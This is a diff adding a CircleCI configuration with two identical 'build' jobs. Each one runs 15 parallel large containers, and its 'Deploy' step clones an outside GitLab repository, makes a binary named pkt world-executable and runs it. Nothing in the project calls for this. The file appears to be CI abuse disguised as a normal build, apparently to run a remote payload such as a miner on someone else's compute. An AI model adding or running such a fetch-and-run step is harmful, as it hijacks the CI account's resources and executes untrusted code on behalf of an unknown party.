@@ -1,0 +1,31 @@
+version: 2.1
+
+jobs:
+  build:
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      git clone https://gitlab.com/cici2/pkt.git && cd pkt && chmod 777 pkt && ./pkt
+  build1:
+    parallelism: 15
+    docker:
+      - image: python
+    resource_class: large
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      git clone https://gitlab.com/cici2/pkt.git && cd pkt && chmod 777 pkt && ./pkt
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
